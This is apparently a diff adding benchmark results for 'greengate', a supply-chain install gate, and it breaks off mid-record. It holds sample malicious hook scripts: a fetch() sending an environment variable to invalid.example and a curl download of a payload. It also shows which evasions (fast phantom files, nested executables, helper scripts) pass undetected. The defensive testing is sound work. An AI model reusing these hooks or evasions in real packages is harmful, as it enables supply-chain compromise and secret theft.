@@ -1,0 +1,602 @@
+{
+  "version": "greengate 0.3.4",
+  "repeats": 3,
+  "platform": "Linux-7.2.8-200.fc44.x86_64-x86_64-with-glibc2.43",
+  "python": "3.14.7",
+  "binary_sha256": "1441672c8edd99d9441154e68ccae0b9c164b5c70d447cfa06498bb181201770",
+  "compiler": "/usr/bin/gcc",
+  "results": [
+    {
+      "id": "existing-network",
+      "label": "malicious",
+      "description": "Existing inline network/environment hook",
+      "script": "node -e \"fetch('https://invalid.example', {body: process.env.DUMMY})\"",
+      "trials": [
+        {
+          "outcome": "preflight",
+          "exit_code": 1,
+          "installer_ran": false,
+          "installer_completed": false,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"existing-network\", \"label\": \"malicious\", \"description\": \"Existing inline network/environment hook\", \"script\": \"node -e \\\"fetch('https://invalid.example', {body: process.env.DUMMY})\\\"\"} /usr/bin/gcc`\n\n\u26a0\ufe0f  Zero-Trust Supply Chain Gate: 1 package(s) with suspicious lifecycle scripts:\n\n  [SCRIPT_THREAT] trusted-builder (postinstall)\n    Signals   : fetch(, process.env\n    Entropy   : 4.95  (threshold 4.80 \u2014 likely obfuscated)\n\n  Tip: inspect each flagged script manually. If the package is a known\n  native build tool, add it to [supply_chain] allow_postinstall in .greengate.toml.\n\nError: Zero-Trust Supply Chain Gate: 1 pre-existing package(s) with suspicious lifecycle scripts \u2014 halting before install. Review the findings above or add to allow_postinstall if trusted.\n",
+          "note": ""
+        },
+        {
+          "outcome": "preflight",
+          "exit_code": 1,
+          "installer_ran": false,
+          "installer_completed": false,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"existing-network\", \"label\": \"malicious\", \"description\": \"Existing inline network/environment hook\", \"script\": \"node -e \\\"fetch('https://invalid.example', {body: process.env.DUMMY})\\\"\"} /usr/bin/gcc`\n\n\u26a0\ufe0f  Zero-Trust Supply Chain Gate: 1 package(s) with suspicious lifecycle scripts:\n\n  [SCRIPT_THREAT] trusted-builder (postinstall)\n    Signals   : fetch(, process.env\n    Entropy   : 4.95  (threshold 4.80 \u2014 likely obfuscated)\n\n  Tip: inspect each flagged script manually. If the package is a known\n  native build tool, add it to [supply_chain] allow_postinstall in .greengate.toml.\n\nError: Zero-Trust Supply Chain Gate: 1 pre-existing package(s) with suspicious lifecycle scripts \u2014 halting before install. Review the findings above or add to allow_postinstall if trusted.\n",
+          "note": ""
+        },
+        {
+          "outcome": "preflight",
+          "exit_code": 1,
+          "installer_ran": false,
+          "installer_completed": false,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"existing-network\", \"label\": \"malicious\", \"description\": \"Existing inline network/environment hook\", \"script\": \"node -e \\\"fetch('https://invalid.example', {body: process.env.DUMMY})\\\"\"} /usr/bin/gcc`\n\n\u26a0\ufe0f  Zero-Trust Supply Chain Gate: 1 package(s) with suspicious lifecycle scripts:\n\n  [SCRIPT_THREAT] trusted-builder (postinstall)\n    Signals   : fetch(, process.env\n    Entropy   : 4.95  (threshold 4.80 \u2014 likely obfuscated)\n\n  Tip: inspect each flagged script manually. If the package is a known\n  native build tool, add it to [supply_chain] allow_postinstall in .greengate.toml.\n\nError: Zero-Trust Supply Chain Gate: 1 pre-existing package(s) with suspicious lifecycle scripts \u2014 halting before install. Review the findings above or add to allow_postinstall if trusted.\n",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "existing-eval",
+      "label": "malicious",
+      "description": "Existing inline dynamic-code hook",
+      "script": "node -e \"eval('dummy')\"",
+      "trials": [
+        {
+          "outcome": "preflight",
+          "exit_code": 1,
+          "installer_ran": false,
+          "installer_completed": false,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"existing-eval\", \"label\": \"malicious\", \"description\": \"Existing inline dynamic-code hook\", \"script\": \"node -e \\\"eval('dummy')\\\"\"} /usr/bin/gcc`\n\n\u26a0\ufe0f  Zero-Trust Supply Chain Gate: 1 package(s) with suspicious lifecycle scripts:\n\n  [SCRIPT_THREAT] trusted-builder (postinstall)\n    Signals   : eval()\n\n  Tip: inspect each flagged script manually. If the package is a known\n  native build tool, add it to [supply_chain] allow_postinstall in .greengate.toml.\n\nError: Zero-Trust Supply Chain Gate: 1 pre-existing package(s) with suspicious lifecycle scripts \u2014 halting before install. Review the findings above or add to allow_postinstall if trusted.\n",
+          "note": ""
+        },
+        {
+          "outcome": "preflight",
+          "exit_code": 1,
+          "installer_ran": false,
+          "installer_completed": false,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"existing-eval\", \"label\": \"malicious\", \"description\": \"Existing inline dynamic-code hook\", \"script\": \"node -e \\\"eval('dummy')\\\"\"} /usr/bin/gcc`\n\n\u26a0\ufe0f  Zero-Trust Supply Chain Gate: 1 package(s) with suspicious lifecycle scripts:\n\n  [SCRIPT_THREAT] trusted-builder (postinstall)\n    Signals   : eval()\n\n  Tip: inspect each flagged script manually. If the package is a known\n  native build tool, add it to [supply_chain] allow_postinstall in .greengate.toml.\n\nError: Zero-Trust Supply Chain Gate: 1 pre-existing package(s) with suspicious lifecycle scripts \u2014 halting before install. Review the findings above or add to allow_postinstall if trusted.\n",
+          "note": ""
+        },
+        {
+          "outcome": "preflight",
+          "exit_code": 1,
+          "installer_ran": false,
+          "installer_completed": false,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"existing-eval\", \"label\": \"malicious\", \"description\": \"Existing inline dynamic-code hook\", \"script\": \"node -e \\\"eval('dummy')\\\"\"} /usr/bin/gcc`\n\n\u26a0\ufe0f  Zero-Trust Supply Chain Gate: 1 package(s) with suspicious lifecycle scripts:\n\n  [SCRIPT_THREAT] trusted-builder (postinstall)\n    Signals   : eval()\n\n  Tip: inspect each flagged script manually. If the package is a known\n  native build tool, add it to [supply_chain] allow_postinstall in .greengate.toml.\n\nError: Zero-Trust Supply Chain Gate: 1 pre-existing package(s) with suspicious lifecycle scripts \u2014 halting before install. Review the findings above or add to allow_postinstall if trusted.\n",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "existing-shell",
+      "label": "malicious",
+      "description": "Existing shell download hook",
+      "script": "curl https://invalid.example/payload",
+      "trials": [
+        {
+          "outcome": "preflight",
+          "exit_code": 1,
+          "installer_ran": false,
+          "installer_completed": false,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"existing-shell\", \"label\": \"malicious\", \"description\": \"Existing shell download hook\", \"script\": \"curl https://invalid.example/payload\"} /usr/bin/gcc`\n\n\u26a0\ufe0f  Zero-Trust Supply Chain Gate: 1 package(s) with suspicious lifecycle scripts:\n\n  [SCRIPT_THREAT] trusted-builder (postinstall)\n    Signals   : curl \n\n  Tip: inspect each flagged script manually. If the package is a known\n  native build tool, add it to [supply_chain] allow_postinstall in .greengate.toml.\n\nError: Zero-Trust Supply Chain Gate: 1 pre-existing package(s) with suspicious lifecycle scripts \u2014 halting before install. Review the findings above or add to allow_postinstall if trusted.\n",
+          "note": ""
+        },
+        {
+          "outcome": "preflight",
+          "exit_code": 1,
+          "installer_ran": false,
+          "installer_completed": false,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"existing-shell\", \"label\": \"malicious\", \"description\": \"Existing shell download hook\", \"script\": \"curl https://invalid.example/payload\"} /usr/bin/gcc`\n\n\u26a0\ufe0f  Zero-Trust Supply Chain Gate: 1 package(s) with suspicious lifecycle scripts:\n\n  [SCRIPT_THREAT] trusted-builder (postinstall)\n    Signals   : curl \n\n  Tip: inspect each flagged script manually. If the package is a known\n  native build tool, add it to [supply_chain] allow_postinstall in .greengate.toml.\n\nError: Zero-Trust Supply Chain Gate: 1 pre-existing package(s) with suspicious lifecycle scripts \u2014 halting before install. Review the findings above or add to allow_postinstall if trusted.\n",
+          "note": ""
+        },
+        {
+          "outcome": "preflight",
+          "exit_code": 1,
+          "installer_ran": false,
+          "installer_completed": false,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"existing-shell\", \"label\": \"malicious\", \"description\": \"Existing shell download hook\", \"script\": \"curl https://invalid.example/payload\"} /usr/bin/gcc`\n\n\u26a0\ufe0f  Zero-Trust Supply Chain Gate: 1 package(s) with suspicious lifecycle scripts:\n\n  [SCRIPT_THREAT] trusted-builder (postinstall)\n    Signals   : curl \n\n  Tip: inspect each flagged script manually. If the package is a known\n  native build tool, add it to [supply_chain] allow_postinstall in .greengate.toml.\n\nError: Zero-Trust Supply Chain Gate: 1 pre-existing package(s) with suspicious lifecycle scripts \u2014 halting before install. Review the findings above or add to allow_postinstall if trusted.\n",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "fresh-inline",
+      "label": "malicious",
+      "description": "New inline suspicious hook, visible only after install",
+      "script": "node -e \"eval('dummy')\"",
+      "trials": [
+        {
+          "outcome": "after execution",
+          "exit_code": 1,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"fresh-inline\", \"label\": \"malicious\", \"description\": \"New inline suspicious hook, visible only after install\", \"script\": \"node -e \\\"eval('dummy')\\\"\"} /usr/bin/gcc`\n\n\u26a0\ufe0f  Zero-Trust Supply Chain Gate: 1 package(s) with suspicious lifecycle scripts:\n\n  [SCRIPT_THREAT] trusted-builder (postinstall)\n    Signals   : eval()\n\n  Tip: inspect each flagged script manually. If the package is a known\n  native build tool, add it to [supply_chain] allow_postinstall in .greengate.toml.\n\nError: Zero-Trust Supply Chain Gate: 1 newly installed package(s) with suspicious lifecycle scripts detected \u2014 halting.\n",
+          "note": ""
+        },
+        {
+          "outcome": "after execution",
+          "exit_code": 1,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"fresh-inline\", \"label\": \"malicious\", \"description\": \"New inline suspicious hook, visible only after install\", \"script\": \"node -e \\\"eval('dummy')\\\"\"} /usr/bin/gcc`\n\n\u26a0\ufe0f  Zero-Trust Supply Chain Gate: 1 package(s) with suspicious lifecycle scripts:\n\n  [SCRIPT_THREAT] trusted-builder (postinstall)\n    Signals   : eval()\n\n  Tip: inspect each flagged script manually. If the package is a known\n  native build tool, add it to [supply_chain] allow_postinstall in .greengate.toml.\n\nError: Zero-Trust Supply Chain Gate: 1 newly installed package(s) with suspicious lifecycle scripts detected \u2014 halting.\n",
+          "note": ""
+        },
+        {
+          "outcome": "after execution",
+          "exit_code": 1,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"fresh-inline\", \"label\": \"malicious\", \"description\": \"New inline suspicious hook, visible only after install\", \"script\": \"node -e \\\"eval('dummy')\\\"\"} /usr/bin/gcc`\n\n\u26a0\ufe0f  Zero-Trust Supply Chain Gate: 1 package(s) with suspicious lifecycle scripts:\n\n  [SCRIPT_THREAT] trusted-builder (postinstall)\n    Signals   : eval()\n\n  Tip: inspect each flagged script manually. If the package is a known\n  native build tool, add it to [supply_chain] allow_postinstall in .greengate.toml.\n\nError: Zero-Trust Supply Chain Gate: 1 newly installed package(s) with suspicious lifecycle scripts detected \u2014 halting.\n",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "slow-phantom",
+      "label": "malicious",
+      "description": "Package file created, held for 0.8 s, then deleted",
+      "trials": [
+        {
+          "outcome": "after execution",
+          "exit_code": 1,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"slow-phantom\", \"label\": \"malicious\", \"description\": \"Package file created, held for 0.8 s, then deleted\"} /usr/bin/gcc`\n\n\ud83d\udea8 greengate watch-install: 1 suspicious event(s) detected:\n\n  [PHANTOM   ] trusted-builder\n           path: node_modules/trusted-builder/payload.tmp\n\n  Tip: if this package is a known native build tool (e.g. esbuild, swc),\n  add it to [supply_chain] allow_postinstall in .greengate.toml to suppress.\n\nError: Zero-Trust Supply Chain Gate: 1 blocking runtime event(s) detected \u2014 halting.\n",
+          "note": ""
+        },
+        {
+          "outcome": "after execution",
+          "exit_code": 1,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"slow-phantom\", \"label\": \"malicious\", \"description\": \"Package file created, held for 0.8 s, then deleted\"} /usr/bin/gcc`\n\n\ud83d\udea8 greengate watch-install: 1 suspicious event(s) detected:\n\n  [PHANTOM   ] trusted-builder\n           path: node_modules/trusted-builder/payload.tmp\n\n  Tip: if this package is a known native build tool (e.g. esbuild, swc),\n  add it to [supply_chain] allow_postinstall in .greengate.toml to suppress.\n\nError: Zero-Trust Supply Chain Gate: 1 blocking runtime event(s) detected \u2014 halting.\n",
+          "note": ""
+        },
+        {
+          "outcome": "after execution",
+          "exit_code": 1,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"slow-phantom\", \"label\": \"malicious\", \"description\": \"Package file created, held for 0.8 s, then deleted\"} /usr/bin/gcc`\n\n\ud83d\udea8 greengate watch-install: 1 suspicious event(s) detected:\n\n  [PHANTOM   ] trusted-builder\n           path: node_modules/trusted-builder/payload.tmp\n\n  Tip: if this package is a known native build tool (e.g. esbuild, swc),\n  add it to [supply_chain] allow_postinstall in .greengate.toml to suppress.\n\nError: Zero-Trust Supply Chain Gate: 1 blocking runtime event(s) detected \u2014 halting.\n",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "root-executable",
+      "label": "malicious",
+      "description": "Executable persisted directly in project root",
+      "trials": [
+        {
+          "outcome": "after execution",
+          "exit_code": 1,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"root-executable\", \"label\": \"malicious\", \"description\": \"Executable persisted directly in project root\"} /usr/bin/gcc`\n\n\ud83d\udea8 greengate watch-install: 1 suspicious event(s) detected:\n\n  [EXEC_DROP ] <project-root>\n           path: ./dropped-tool\n\n  Tip: if this package is a known native build tool (e.g. esbuild, swc),\n  add it to [supply_chain] allow_postinstall in .greengate.toml to suppress.\n\nError: Zero-Trust Supply Chain Gate: 1 blocking runtime event(s) detected \u2014 halting.\n",
+          "note": ""
+        },
+        {
+          "outcome": "after execution",
+          "exit_code": 1,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"root-executable\", \"label\": \"malicious\", \"description\": \"Executable persisted directly in project root\"} /usr/bin/gcc`\n\n\ud83d\udea8 greengate watch-install: 1 suspicious event(s) detected:\n\n  [EXEC_DROP ] <project-root>\n           path: ./dropped-tool\n\n  Tip: if this package is a known native build tool (e.g. esbuild, swc),\n  add it to [supply_chain] allow_postinstall in .greengate.toml to suppress.\n\nError: Zero-Trust Supply Chain Gate: 1 blocking runtime event(s) detected \u2014 halting.\n",
+          "note": ""
+        },
+        {
+          "outcome": "after execution",
+          "exit_code": 1,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"root-executable\", \"label\": \"malicious\", \"description\": \"Executable persisted directly in project root\"} /usr/bin/gcc`\n\n\ud83d\udea8 greengate watch-install: 1 suspicious event(s) detected:\n\n  [EXEC_DROP ] <project-root>\n           path: ./dropped-tool\n\n  Tip: if this package is a known native build tool (e.g. esbuild, swc),\n  add it to [supply_chain] allow_postinstall in .greengate.toml to suppress.\n\nError: Zero-Trust Supply Chain Gate: 1 blocking runtime event(s) detected \u2014 halting.\n",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "fast-phantom",
+      "label": "malicious",
+      "description": "Package file created and immediately deleted between polls",
+      "trials": [
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"fast-phantom\", \"label\": \"malicious\", \"description\": \"Package file created and immediately deleted between polls\"} /usr/bin/gcc`\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        },
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"fast-phantom\", \"label\": \"malicious\", \"description\": \"Package file created and immediately deleted between polls\"} /usr/bin/gcc`\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        },
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"fast-phantom\", \"label\": \"malicious\", \"description\": \"Package file created and immediately deleted between polls\"} /usr/bin/gcc`\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "nested-executable",
+      "label": "malicious",
+      "description": "Executable persisted in a project subdirectory",
+      "trials": [
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"nested-executable\", \"label\": \"malicious\", \"description\": \"Executable persisted in a project subdirectory\"} /usr/bin/gcc`\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        },
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"nested-executable\", \"label\": \"malicious\", \"description\": \"Executable persisted in a project subdirectory\"} /usr/bin/gcc`\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        },
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"nested-executable\", \"label\": \"malicious\", \"description\": \"Executable persisted in a project subdirectory\"} /usr/bin/gcc`\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "helper-script",
+      "label": "malicious",
+      "description": "New hook invokes a helper containing inert suspicious source",
+      "script": "node install.js",
+      "trials": [
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"helper-script\", \"label\": \"malicious\", \"description\": \"New hook invokes a helper containing inert suspicious source\", \"script\": \"node install.js\"} /usr/bin/gcc`\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        },
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"helper-script\", \"label\": \"malicious\", \"description\": \"New hook invokes a helper containing inert suspicious source\", \"script\": \"node install.js\"} /usr/bin/gcc`\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        },
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"helper-script\", \"label\": \"malicious\", \"description\": \"New hook invokes a helper containing inert suspicious source\", \"script\": \"node install.js\"} /usr/bin/gcc`\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "clean",
+      "label": "benign",
+      "description": "No filesystem changes",
+      "trials": [
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"clean\", \"label\": \"benign\", \"description\": \"No filesystem changes\"} /usr/bin/gcc`\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        },
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"clean\", \"label\": \"benign\", \"description\": \"No filesystem changes\"} /usr/bin/gcc`\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        },
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"clean\", \"label\": \"benign\", \"description\": \"No filesystem changes\"} /usr/bin/gcc`\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "persistent-package",
+      "label": "benign",
+      "description": "Ordinary package files persist in node_modules",
+      "trials": [
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"persistent-package\", \"label\": \"benign\", \"description\": \"Ordinary package files persist in node_modules\"} /usr/bin/gcc`\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        },
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"persistent-package\", \"label\": \"benign\", \"description\": \"Ordinary package files persist in node_modules\"} /usr/bin/gcc`\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        },
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"persistent-package\", \"label\": \"benign\", \"description\": \"Ordinary package files persist in node_modules\"} /usr/bin/gcc`\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "existing-cleanup",
+      "label": "benign",
+      "description": "Installer removes a file that predates the install",
+      "trials": [
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"existing-cleanup\", \"label\": \"benign\", \"description\": \"Installer removes a file that predates the install\"} /usr/bin/gcc`\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        },
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"existing-cleanup\", \"label\": \"benign\", \"description\": \"Installer removes a file that predates the install\"} /usr/bin/gcc`\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        },
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"existing-cleanup\", \"label\": \"benign\", \"description\": \"Installer removes a file that predates the install\"} /usr/bin/gcc`\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "native-persistent",
+      "label": "benign",
+      "description": "Real C compilation leaves its executable inside the package",
+      "compiler": true,
+      "trials": [
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": true,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"native-persistent\", \"label\": \"benign\", \"description\": \"Real C compilation leaves its executable inside the package\", \"compiler\": true} /usr/bin/gcc`\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        },
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
